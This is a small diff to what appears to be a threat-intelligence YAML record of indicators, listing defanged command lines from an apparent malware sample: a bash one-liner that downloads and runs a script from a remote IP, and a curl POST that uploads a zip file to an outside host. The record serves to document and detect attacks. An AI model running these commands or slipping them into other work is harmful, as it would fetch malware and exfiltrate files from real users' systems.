@@ -8,8 +8,7 @@ TTPs:
   - curl
   commandline:
   - /bin/bash -c "$(curl -fsSL hxxp://91.92.242.30/ece0f208u7uqhs6x)"
-  - curl -X POST hxxps://socifiapp[.]com/api/reports/upload -F user_id=47 -F build_tag=jhzhhfomng
-    -F report_file=@FILENAME.zip
+  - curl -X POST hxxps://socifiapp[.]com/api/reports/upload -F user_id=47 -F build_tag=jhzhhfomng -F report_file=@FILENAME.zip
   powershell: []
   scripting_engine:
   - bash
